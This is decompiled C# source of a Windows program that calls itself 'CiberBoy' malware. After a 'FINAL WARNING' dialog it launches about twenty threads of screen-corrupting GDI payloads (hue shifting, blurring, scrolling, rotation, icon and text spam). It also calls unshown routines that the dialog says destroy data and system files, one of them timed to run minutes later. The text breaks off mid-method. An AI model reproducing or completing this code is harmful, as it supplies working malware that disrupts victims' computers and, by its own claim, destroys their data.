using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace CiberBoy
{
  public class gdi
  {
    public const uint SRCCOPY = 13369376;
    public const uint SRCPAINT = 15597702;
    public const uint SRCAND = 8913094;
    public const uint SRCINVERT = 6684742;
    public const uint SRCERASE = 4457256;
    public const uint NOTSRCCOPY = 3342344;
    public const uint NOTSRCERASE = 1114278;
    public const uint MERGECOPY = 12583114;
    public const uint MERGEPAINT = 12255782;
    public const uint PATCOPY = 15728673;
    public const uint PATPAINT = 16452105;
    public const uint PATINVERT = 5898313;
    public const uint DSTINVERT = 5570569;
    public const uint BLACKNESS = 66;
    public const uint WHITENESS = 16711778;
    public const uint CAPTUREBLT = 1073741824;
    public const uint CUSTOM = 1051781;
    public static gdi.BLENDFUNCTION BlendFunction = new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 80, (byte) 0);
    public static double waveAngle = 0.0;
    public const double waveSpeed = 9.0;
    public const double waveHeight = 10.0;
    public static int flipCounter = 0;
    public static bool payloadsactivated = false;
    public static int A;
    public static int R;
    public static int G;
    public static int B;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr intptr_0);

    [DllImport("gdi32.dll", SetLastError = true)]
    private static extern IntPtr CreateCompatibleDC(IntPtr intptr_0);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt(
      IntPtr intptr_0,
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      IntPtr intptr_1,
      int int_4,
      int int_5,
      uint uint_0);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr intptr_0,
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      IntPtr intptr_1,
      int int_4,
      int int_5,
      int int_6,
      int int_7,
      uint uint_0);

    [DllImport("gdi32.dll")]
    private static extern bool PlgBlt(
      IntPtr intptr_0,
      gdi.POINT[] point_0,
      IntPtr intptr_1,
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      IntPtr intptr_2,
      int int_4,
      int int_5);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(
      IntPtr intptr_0,
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      uint uint_0);

    [DllImport("gdi32.dll")]
    public static extern bool GdiAlphaBlend(
      IntPtr hdcDest,
      int nXOriginDest,
      int nYOriginDest,
      int nWidthDest,
      int nHeightDest,
      IntPtr hdcSrc,
      int int_0,
      int int_1,
      int nWidthSrc,
      int nHeightSrc,
      gdi.BLENDFUNCTION blendFunction);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint uint_0);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr hdc);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr intptr_0);

    [DllImport("user32.dll")]
    private static extern bool InvalidateRect(IntPtr intptr_0, IntPtr intptr_1, bool bool_0);

    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr intptr_0, IntPtr intptr_1);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr intptr_0, int int_0, int int_1);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr intptr_0, int int_0, int int_1, IntPtr intptr_1);

    [DllImport("user32.dll")]
    private static extern IntPtr LoadCursor(IntPtr intptr_0, int int_0);

    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      SystemSounds.Exclamation.Play();
      Application.Run((Form) new Form1());
    }

    public static void warning()
    {
      if (MessageBox.Show("!!! FINAL WARNING !!!\nTHIS IS THE LAST CHANCE TO STOP THIS PROGRAM FROM EXECUTING!\nTHIS MALWARE HAS FULL CAPACITY TO DESTROY YOUR DATA AND SYSTEM FILES!\nYOU WON'T BE ABLE TO USE WINDOWS AGAIN IF YOU PROCEED!\nThe creator of this malware is not responsible for any damage made.\nAre you absolutely sure you want to run this?", "CiberBoy.exe - !!! FINAL WARNING !!!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
      {
        Class1.smethod_4();
        Class1.smethod_1();
        Thread thread = new Thread(new ThreadStart(gdi.GdiThread));
        new Thread(new ThreadStart(Class1.smethod_3)).Start();
        thread.Start();
        Thread.Sleep(new Random().Next(270000, 315000));
        Class1.smethod_0();
      }
      else
        Environment.Exit(0);
    }

    public static void GdiThread()
    {
      Random random = new Random();
      Thread.Sleep(5000);
      new Thread(new ThreadStart(Class3.smethod_0)).Start();
      Thread thread1 = new Thread(new ThreadStart(gdi.hueshifting));
      Thread thread2 = new Thread(new ThreadStart(gdi.messyBlur));
      Thread thread3 = new Thread(new ThreadStart(gdi.constantClearing));
      Thread thread4 = new Thread(new ThreadStart(gdi.horizontalScroll));
      Thread thread5 = new Thread(new ThreadStart(gdi.Circles));
      Thread thread6 = new Thread(new ThreadStart(gdi.vscroll));
      Thread thread7 = new Thread(new ThreadStart(gdi.mess));
      Thread thread8 = new Thread(new ThreadStart(gdi.smethod_6));
      Thread thread9 = new Thread(new ThreadStart(gdi.pixelation));
      Thread thread10 = new Thread(new ThreadStart(gdi.rotation));
      Thread thread11 = new Thread(new ThreadStart(gdi.blur1));
      Thread thread12 = new Thread(new ThreadStart(gdi.smethod_7));
      Thread thread13 = new Thread(new ThreadStart(gdi.rndcolors));
      Thread thread14 = new Thread(new ThreadStart(gdi.smethod_9));
      Thread thread15 = new Thread(new ThreadStart(gdi.penmess));
      Thread thread16 = new Thread(new ThreadStart(gdi.smethod_8));
      Thread thread17 = new Thread(new ThreadStart(gdi.diagonalscrolling));
      Thread thread18 = new Thread(new ThreadStart(gdi.rotation1));
      Thread thread19 = new Thread(new ThreadStart(gdi.randomrotation));
      thread1.Start();
      thread2.Start();
      thread3.Start();
      thread4.Start();
      thread5.Start();
      thread6.Start();
      thread7.Start();
      thread8.Start();
      thread9.Start();
      thread10.Start();
      thread11.Start();
      thread12.Start();
      thread13.Start();
      thread14.Start();
      thread15.Start();
      thread16.Start();
      thread17.Start();
      thread18.Start();
      thread19.Start();
      Thread thread20 = new Thread(new ThreadStart(gdi.icons));
      Thread thread21 = new Thread(new ThreadStart(Class3.smethod_1));
      Thread thread22 = new Thread(new ThreadStart(Class3.smethod_2));
      Thread thread23 = new Thread(new ThreadStart(Class3.smethod_3));
      Thread thread24 = new Thread(new ThreadStart(Class0.smethod_0));
      Thread thread25 = new Thread(new ThreadStart(Class3.smethod_5));
      thread24.Start();
      thread20.Start();
      thread21.Start();
      thread22.Start();
      thread23.Start();
      thread25.Start();
      while (true)
      {
        gdi.clear();
        thread1.Suspend();
        thread2.Suspend();
        thread3.Suspend();
        thread4.Suspend();
        thread5.Suspend();
        thread6.Suspend();
        thread7.Suspend();
        thread9.Suspend();
        thread10.Suspend();
        thread11.Suspend();
        thread12.Suspend();
        thread13.Suspend();
        thread14.Suspend();
        thread15.Suspend();
        thread16.Suspend();
        thread17.Suspend();
        thread18.Suspend();
        thread8.Suspend();
        thread19.Suspend();
        gdi.payloadsactivated = true;
        gdi.clear();
        gdi.A = (int) byte.MaxValue;
        gdi.R = (int) byte.MaxValue;
        gdi.G = 0;
        gdi.B = 0;
        if (random.Next(1, 15) == 1)
          thread1.Resume();
        else
          goto label_3;
label_2:
        Thread.Sleep(10000);
        continue;
label_3:
        if (random.Next(1, 15) != 2)
        {
          if (random.Next(1, 15) == 3)
          {
            thread4.Resume();
            thread5.Resume();
            thread3.Resume();
            goto label_2;
          }
          else if (random.Next(1, 15) == 4)
          {
            thread6.Resume();
            goto label_2;
          }
          else if (random.Next(1, 15) == 5)
          {
            thread7.Resume();
            goto label_2;
          }
          else if (random.Next(1, 15) != 6)
          {
            if (random.Next(1, 15) == 7)
            {
              thread10.Resume();
              goto label_2;
            }
            else if (random.Next(1, 16) != 8)
            {
              if (random.Next(1, 15) == 9)
              {
                thread12.Resume();
                goto label_2;
              }
              else if (random.Next(1, 16) != 10)
              {
                if (random.Next(1, 15) == 11)
                {
                  thread15.Resume();
                  thread16.Resume();
                  goto label_2;
                }
                else if (random.Next(1, 15) == 12)
                {
                  thread17.Resume();
                  goto label_2;
                }
                else if (random.Next(1, 15) != 13)
                {
                  if (random.Next(1, 15) == 14)
                  {
                    thread19.Resume();
                    goto label_2;
                  }
                  else if (random.Next(1, 15) == 1)
                  {
                    thread1.Resume();
                    goto label_2;
                  }
                  else if (random.Next(1, 15) == 2)
                  {
                    thread2.Resume();
                    thread3.Resume();
                    goto label_2;
                  }
                  else if (random.Next(1, 15) != 3)
                  {
                    if (random.Next(1, 15) == 4)
                    {
                      thread6.Resume();
                      goto label_2;
                    }
                    else if (random.Next(1, 15) == 5)
                    {
                      thread7.Resume();
                      goto label_2;
                    }
                    else if (random.Next(1, 15) != 6)
                    {
                      if (random.Next(1, 15) == 7)
                      {
                        thread10.Resume();
                        goto label_2;
                      }
                      else if (random.Next(1, 16) != 8)
                      {
                        if (random.Next(1, 15) != 9)
                        {
                          if (random.Next(1, 16) == 10)
                          {
                            thread13.Resume();
                            thread14.Resume();
                            goto label_2;
                          }
                          else if (random.Next(1, 15) == 11)
                          {
                            thread15.Resume();
                            thread16.Resume();
                            goto label_2;
                          }
                          else if (random.Next(1, 15) == 12)
                          {
                            thread17.Resume();
                            goto label_2;
                          }
                          else if (random.Next(1, 15) != 13)
                          {
                            if (random.Next(1, 15) != 14)
                            {
                              thread14.Resume();
                              thread8.Resume();
                              goto label_2;
                            }
                            else
                            {
                              thread19.Resume();
                              goto label_2;
                            }
                          }
                          else
                          {
                            thread18.Resume();
                            goto label_2;
                          }
                        }
                        else
                        {
                          thread12.Resume();
                          goto label_2;
                        }
                      }
                      else
                      {
                        thread11.Resume();
                        goto label_2;
                      }
                    }
                    else
                    {
                      thread9.Resume();
                      goto label_2;
                    }
                  }
                  else
                  {
                    thread4.Resume();
                    thread5.Resume();
                    thread3.Resume();
                    goto label_2;
                  }
                }
                else
                {
                  thread18.Resume();
                  goto label_2;
                }
              }
              else
              {
                thread13.Resume();
                thread14.Resume();
                goto label_2;
              }
            }
            else
            {
              thread11.Resume();
              goto label_2;
            }
          }
          else
          {
            thread9.Resume();
            goto label_2;
          }
        }
        else
        {
          thread2.Resume();
          thread3.Resume();
          goto label_2;
        }
      }
    }

    public static void icons()
    {
      Random random = new Random();
      while (true)
      {
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        Graphics.FromHdc(dc).DrawIcon(SystemIcons.WinLogo, random.Next(width), random.Next(height));
        Graphics.FromHdc(dc).Dispose();
        Thread.Sleep(25);
        gdi.DeleteDC(dc);
      }
    }

    private static void smethod_0()
    {
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      for (int index = 0; index < height; ++index)
      {
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int int_0 = (int) (Math.Sin(((double) index + gdi.waveAngle) * 0.05) * 10.0);
        gdi.StretchBlt(dc, int_0, index, width, 1, dc, 0, index, width, 1, 13369376U);
        gdi.DeleteDC(dc);
      }
      gdi.waveAngle += 9.0;
      ++gdi.flipCounter;
    }

    public static void hueshifting()
    {
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      float float_0 = 0.0f;
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hgdiobj = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        using (Bitmap object_0 = Image.FromHbitmap(compatibleBitmap))
        {
          gdi.smethod_1((object) object_0, float_0);
          using (Graphics graphics = Graphics.FromHdc(dc))
            graphics.DrawImage((Image) object_0, 0, 0);
        }
        gdi.SelectObject(compatibleDc, hgdiobj);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteDC(dc);
        gdi.smethod_0();
        float_0 = 22f;
        Thread.Sleep(1);
      }
    }

    private static void smethod_1(object object_0, float float_0)
    {
      BitmapData bitmapdata = ((Bitmap) object_0).LockBits(new Rectangle(0, 0, ((Image) object_0).Width, ((Image) object_0).Height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
      int stride = bitmapdata.Stride;
      IntPtr scan0 = bitmapdata.Scan0;
      int length = Math.Abs(stride) * ((Image) object_0).Height;
      byte[] numArray = new byte[length];
      Marshal.Copy(scan0, numArray, 0, length);
      for (int index = 0; index < numArray.Length; index += 3)
      {
        byte byte_2 = numArray[index];
        byte byte_1 = numArray[index + 1];
        Class2 class2 = gdi.smethod_2(numArray[index + 2], byte_1, byte_2, float_0);
        numArray[index] = class2.byte_2;
        numArray[index + 1] = class2.byte_1;
        numArray[index + 2] = class2.byte_0;
      }
      Marshal.Copy(numArray, 0, scan0, length);
      ((Bitmap) object_0).UnlockBits(bitmapdata);
    }

    private static Class2 smethod_2(byte byte_0, byte byte_1, byte byte_2, float float_0)
    {
      float float_0_1;
      float float_1;
      float float_2;
      gdi.smethod_3(byte_0, byte_1, byte_2, out float_0_1, out float_1, out float_2);
      return gdi.smethod_4((float) (((double) float_0_1 + (double) float_0) % 360.0), float_1, float_2);
    }

    private static void smethod_3(
      byte byte_0,
      byte byte_1,
      byte byte_2,
      out float float_0,
      out float float_1,
      out float float_2)
    {
      float val1_1 = (float) byte_0 / (float) byte.MaxValue;
      float val1_2 = (float) byte_1 / (float) byte.MaxValue;
      float val2 = (float) byte_2 / (float) byte.MaxValue;
      float num1 = Math.Max(val1_1, Math.Max(val1_2, val2));
      float num2 = Math.Min(val1_1, Math.Min(val1_2, val2));
      float num3 = num1 - num2;
      float_2 = (float) (((double) num1 + (double) num2) / 2.0);
      if ((double) num3 != 0.0)
      {
        float_1 = (double) float_2 > 0.5 ? num3 / (2f - num1 - num2) : num3 / (num1 + num2);
        float_0 = (double) num1 != (double) val1_1 ? ((double) num1 == (double) val1_2 ? (float) (((double) val2 - (double) val1_1) / (double) num3 + 2.0) : (float) (((double) val1_1 - (double) val1_2) / (double) num3 + 4.0)) : (float) (((double) val1_2 - (double) val2) / (double) num3 + ((double) val1_2 < (double) val2 ? 6.0 : 0.0));
        float_0 *= 60f;
      }
      else
      {
        ref float local1 = ref float_0;
        ref float local2 = ref float_1;
        float num4 = 0.0f;
        local2 = 0.0f;
        double num5 = (double) num4;
        local1 = (float) num5;
      }
    }

    private static Class2 smethod_4(float float_0, float float_1, float float_2)
    {
      float num1;
      float num2;
      float num3;
      if ((double) float_1 == 0.0)
      {
        double num4;
        num1 = (float) (num4 = (double) float_2);
        num2 = (float) num4;
        num3 = (float) num4;
      }
      else
      {
        float float_1_1 = (double) float_2 < 0.5 ? float_2 * (1f + float_1) : (float) ((double) float_2 + (double) float_1 - (double) float_2 * (double) float_1);
        float float_0_1 = 2f * float_2 - float_1_1;
        num3 = gdi.smethod_5(float_0_1, float_1_1, float_0 + 120f);
        num2 = gdi.smethod_5(float_0_1, float_1_1, float_0);
        num1 = gdi.smethod_5(float_0_1, float_1_1, float_0 - 120f);
      }
      return new Class2((byte) ((double) num3 * (double) byte.MaxValue), (byte) ((double) num2 * (double) byte.MaxValue), (byte) ((double) num1 * (double) byte.MaxValue));
    }

    private static float smethod_5(float float_0, float float_1, float float_2)
    {
      if ((double) float_2 < 0.0)
        float_2 += 360f;
      if ((double) float_2 > 360.0)
        float_2 -= 360f;
      return (double) float_2 >= 60.0 ? ((double) float_2 < 180.0 ? float_1 : ((double) float_2 >= 240.0 ? float_0 : float_0 + (float) (((double) float_1 - (double) float_0) * (240.0 - (double) float_2) / 60.0))) : float_0 + (float) (((double) float_1 - (double) float_0) * (double) float_2 / 60.0);
    }

    public static void messyBlur()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        Random random = new Random();
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        for (int index = 0; index < 6; ++index)
        {
          int num1 = random.Next(width);
          int num2 = random.Next(height);
          gdi.BitBlt(dc, num1 + random.Next(-10, 10), num2 + random.Next(-10, 10), num1, num2, dc, num1, num2, 13369376U);
          Thread.Sleep(1);
        }
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        gdi.GdiAlphaBlend(dc, random.Next(-5, 5), random.Next(-5, 5), width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 70, (byte) 0));
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 66U);
        gdi.GdiAlphaBlend(dc, 0, 0, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 10, (byte) 0));
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void horizontalScroll()
    {
      int int_0 = 1;
      while (true)
      {
        while (!gdi.payloadsactivated)
          int_0 = 1;
        try
        {
          IntPtr dc = gdi.GetDC(IntPtr.Zero);
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          int width = bounds.Width;
          bounds = Screen.PrimaryScreen.Bounds;
          int height = bounds.Height;
          Random random = new Random();
          IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
          IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
          IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
          gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
          gdi.BitBlt(dc, int_0, 0, width, height, compatibleDc, 0, 0, 13369376U);
          gdi.BitBlt(dc, -width + int_0, 0, width, height, compatibleDc, 0, 0, 13369376U);
          ++int_0;
          Thread.Sleep(50);
          gdi.DeleteDC(dc);
          gdi.DeleteDC(compatibleDc);
          gdi.DeleteObject(compatibleBitmap);
          gdi.DeleteObject(hObject);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public static void Circles()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        Random random = new Random();
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        int num1 = random.Next(width);
        int num2 = random.Next(height);
        Brush brush = (Brush) new SolidBrush(Color.FromArgb(random.Next(1, 48), random.Next(50), random.Next(50), random.Next(50)));
        Graphics.FromHdc(dc).FillEllipse(brush, num1 + random.Next(-500, 500), num2 + random.Next(-500, 500), 150, 150);
        gdi.DeleteDC(dc);
      }
    }

    public static void smethod_6()
    {
      Random random = new Random();
      while (true)
      {
        while (gdi.payloadsactivated)
        {
          IntPtr dc = gdi.GetDC(IntPtr.Zero);
          int width = Screen.PrimaryScreen.Bounds.Width;
          int height = Screen.PrimaryScreen.Bounds.Height;
          gdi.LoadCursor(IntPtr.Zero, 32512);
          random.Next(width);
          random.Next(height);
          Point position = Cursor.Position;
          int y1 = position.Y;
          position = Cursor.Position;
          int x1 = position.X;
          for (int y2 = 0; y2 < height; y2 += 10)
          {
            try
            {
              Brush brush = (Brush) new SolidBrush(Color.FromArgb(128, random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue)));
              Graphics.FromHdc(dc).FillRectangle(brush, 0, y2, width, 10);
              Graphics.FromHdc(dc).Dispose();
            }
            catch (Exception ex)
            {
              Console.WriteLine("CiberBoy.exe was supposed to crash! Not today, though... " + (ex == null ? (string) null : ex.ToString()));
            }
          }
          for (int x2 = 0; x2 < width; x2 += 10)
          {
            try
            {
              Brush brush = (Brush) new SolidBrush(Color.FromArgb(128, random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue)));
              Graphics.FromHdc(dc).FillRectangle(brush, x2, 0, 10, height);
              Graphics.FromHdc(dc).Dispose();
            }
            catch (Exception ex)
            {
              Console.WriteLine("CiberBoy.exe was supposed to crash! Not today, though... " + ex?.ToString());
            }
          }
          Graphics.FromHdc(dc).Dispose();
          gdi.DeleteDC(dc);
          Thread.Sleep(1);
        }
        gdi.R = (int) byte.MaxValue;
        gdi.G = 0;
        gdi.B = 0;
      }
    }

    public static void vscroll()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        Random random = new Random();
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.StretchBlt(compatibleDc, 0, 0, width / 2, height / 2, dc, 0, 0, width, height, 13369376U);
        gdi.StretchBlt(compatibleDc, 0, 0, width * 2, height * 2, compatibleDc, 0, 0, width, height, 13369376U);
        Thread.Sleep(20);
        gdi.BitBlt(dc, 1, height / 3, width, height, compatibleDc, 0, 0, 13369376U);
        gdi.BitBlt(dc, 1, -height + height / 3, width, height, compatibleDc, 0, 0, 13369376U);
        gdi.BitBlt(dc, -width + 1, height / 3, width, height, compatibleDc, 0, 0, 13369376U);
        gdi.BitBlt(dc, -width + 1, -height + height / 3, width, height, compatibleDc, 0, 0, 13369376U);
        IntPtr solidBrush = gdi.CreateSolidBrush(14473946U);
        gdi.SelectObject(dc, solidBrush);
        gdi.BitBlt(dc, 0, 0, width, height, dc, 0, 0, 12583114U);
        Thread.Sleep(20);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(solidBrush);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void mess()
    {
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        Random random = new Random();
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        int num1 = random.Next(1, 100);
        int num2 = random.Next(1, 300);
        int nXOriginDest = num1 + width / 2;
        int nYOriginDest = num2 + height / 2;
        int num3 = width / 2 + 1;
        int num4 = height / 2 + 1;
        gdi.BLENDFUNCTION blendFunction = new gdi.BLENDFUNCTION((byte) 0, (byte) 0, byte.MaxValue, (byte) 0);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        gdi.GdiAlphaBlend(dc, nXOriginDest, nYOriginDest, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest, nYOriginDest + num4, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest, nYOriginDest - height, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest + num3, nYOriginDest + num4, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest - width, nYOriginDest - height, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest, nYOriginDest - num4, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest, nYOriginDest + height, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest - num3, nYOriginDest - num4, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.GdiAlphaBlend(dc, nXOriginDest + width, nYOriginDest + height, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void pixelation()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        random.Next(width);
        random.Next(height);
        Point position = Cursor.Position;
        int y = position.Y;
        position = Cursor.Position;
        int x = position.X;
        int int_2 = width / 2;
        int int_3 = height / 2;
        gdi.BLENDFUNCTION blendFunction = new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 5, (byte) 0);
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        for (int index = 0; index < 21; ++index)
        {
          gdi.StretchBlt(compatibleDc, 0, 0, int_2, int_3, dc, 0, 0, width, height, 13369376U);
          gdi.StretchBlt(dc, 0, 0, width * 2, height * 2, compatibleDc, 0, 0, width, height, 13369376U);
          IntPtr solidBrush = gdi.CreateSolidBrush(13421772U);
          gdi.SelectObject(dc, solidBrush);
          gdi.BitBlt(dc, 0, 0, width, height, dc, 0, 0, 12583114U);
          Thread.Sleep(1);
          Graphics.FromHdc(dc).DrawIcon(SystemIcons.Information, random.Next(width), random.Next(height));
          Graphics.FromHdc(dc).Dispose();
          gdi.DeleteObject(solidBrush);
        }
        gdi.BitBlt(compatibleDc, 0, 0, width, height, compatibleDc, 0, 0, 66U);
        gdi.GdiAlphaBlend(dc, 0, 0, width, height, compatibleDc, 0, 0, width, height, blendFunction);
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void rotation()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        random.Next(width);
        random.Next(height);
        Point position = Cursor.Position;
        int y = position.Y;
        position = Cursor.Position;
        int x = position.X;
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
        gdi.POINT[] point_0 = new gdi.POINT[3];
        point_0[0].X = -20;
        point_0[0].Y = 20;
        point_0[1].X = width - 20;
        point_0[1].Y = -20;
        point_0[2].X = 20;
        point_0[2].Y = height + 20;
        gdi.PlgBlt(compatibleDc, point_0, compatibleDc, 10, 10, width - 20, height - 20, IntPtr.Zero, 0, 0);
        gdi.GdiAlphaBlend(dc, 0, 0, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 70, (byte) 0));
        Thread.Sleep(1);
        for (int index = 0; index < 100; ++index)
        {
          Font font = new Font("Arial", 20f);
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) byte.MaxValue, random.Next(1, (int) byte.MaxValue), random.Next(1, (int) byte.MaxValue), random.Next(1, (int) byte.MaxValue)));
          Graphics.FromHdc(dc).DrawString(Class3.smethod_6(random.Next(0, 5)), font, brush, (float) random.Next(width), (float) random.Next(height), new StringFormat()
          {
            FormatFlags = StringFormatFlags.DirectionRightToLeft
          });
          Graphics.FromHdc(dc).Dispose();
        }
        Graphics.FromHdc(dc).Dispose();
        gdi.DeleteDC(dc);
        gdi.DeleteDC(compatibleDc);
        gdi.DeleteObject(compatibleBitmap);
        gdi.DeleteObject(hObject);
      }
    }

    public static void blur1()
    {
      Random random = new Random();
      while (true)
      {
        do
          ;
        while (!gdi.payloadsactivated);
        IntPtr dc = gdi.GetDC(IntPtr.Zero);
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        IntPtr intptr_1 = gdi.LoadCursor(IntPtr.Zero, 32512);
        int int_0 = random.Next(width);
        int int_1 = random.Next(height);
        Point position = Cursor.Position;
        int y = position.Y;
        position = Cursor.Position;
        int x = position.X;
        IntPtr compatibleDc = gdi.CreateCompatibleDC(dc);
        IntPtr compatibleBitmap = gdi.CreateCompatibleBitmap(dc, width, height);
        IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
        gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
